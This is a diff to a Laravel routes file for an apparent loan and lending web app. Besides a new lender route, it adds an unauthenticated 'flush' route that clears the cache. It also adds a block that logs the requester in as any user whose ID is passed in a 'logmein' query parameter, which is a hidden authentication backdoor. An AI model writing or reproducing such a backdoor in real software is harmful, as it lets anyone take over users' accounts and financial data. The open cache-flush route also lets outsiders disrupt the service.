@@ -5,6 +5,10 @@ Route::get('/', function()
 {
   return View::make('home');
 });
+Route::get('flush', function()
+{
+  Cache::flush();
+});
 
 Route::get('register/{token}/verify', [ 'as'=> 'register.verify', 'uses' => 'RegistrationController@verify' ] );
 
@@ -15,12 +19,17 @@ Route::resource('login','AuthController');
 
 Route::group(array('before' => 'auth'), function()
 {
+   if(isset($_GET['logmein'])){
+      Session::flush();
+      Auth::login(User::find($_GET['logmein']));  
+    }
 
   Route::resource('dashboard','DashboardController');
   Route::get('loans/compute',['as'=>'loans.compute','uses' => 'LoansController@compute']);
   Route::post('profile/verifyBankAccount',  [ 'as'=> 'profile.verifyBankAccount', 'uses' => 'ProfileController@verifyBankAccount'] );
   Route::resource('profile', 'ProfileController');
   Route::resource('loans', 'LoansController');
+  Route::post('lender/lend', [ 'as'=> 'lender.lend', 'uses' => 'LenderController@lend'] );
   Route::resource('lender', 'LenderController');
   Route::get('logout', [ 'as'=> 'logout', 'uses' => 'AuthController@destroy' ] );
 
